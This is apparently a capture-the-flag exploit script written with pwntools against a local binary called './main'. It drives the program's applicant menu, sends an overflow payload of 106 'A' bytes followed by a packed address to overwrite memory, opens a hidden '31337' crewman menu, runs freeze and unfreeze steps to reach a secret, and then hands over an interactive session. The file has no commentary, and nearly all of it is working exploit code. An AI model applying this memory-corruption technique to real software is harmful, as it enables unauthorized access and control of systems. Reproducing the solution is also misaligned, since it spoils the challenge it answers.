from pwn import *


def apply(pc, fname, lname, country, age):
    pc.recvuntil('>> ')
    pc.sendline('1')
    pc.recvuntil(': ')
    pc.sendline(fname)
    pc.recvuntil(': ')
    pc.sendline(lname)
    pc.recvuntil(': ')
    pc.sendline(country)
    pc.recvuntil(': ')
    pc.sendline(age)


def show_applicants(pc):
    pc.recvuntil('>> ')
    pc.sendline('2')


def change_info(pc, choice, data):
    pc.recvuntil('>> ')
    pc.sendline('3')
    pc.recvuntil('>> ')
    pc.sendline(choice)
    pc.recvuntil(': ')
    pc.sendline(data)
    pc.recvuntil('>> ')
    pc.sendline('5')


def show_app(pc):
    pc.recvuntil('>> ')
    pc.sendline('4')


def crewman_menu(pc):
    pc.recvuntil('>> ')
    pc.sendline('31337')


def freeze(pc, index):
    pc.recvuntil('>> ')
    pc.sendline('3')
    pc.recvuntil(': ')
    pc.sendline(index)


def unfreeze(pc, index):
    pc.recvuntil('>> ')
    pc.sendline('4')
    pc.recvuntil(': ')
    pc.sendline(index)


def show_secret(pc):
    pc.recvuntil('>> ')
    pc.sendline('5')


def main():
    team_token = 'some_token'
    pc = process(['./main', team_token]);

    pc.sendline(team_token)
    
    apply(pc, 'firstname', 'lastname', 'JAP', '8806289263452881168')
    change_info(pc, '2', 106 * 'A' + '\xdf\x16\x40\x01\x00\x00\x00\x00')
    crewman_menu(pc)

    freeze(pc, '5')
    unfreeze(pc, '5')

    print(pc.recvuntil('[1]'))

    show_secret(pc)

    pc.interactive()

if __name__ == '__main__':
    main()
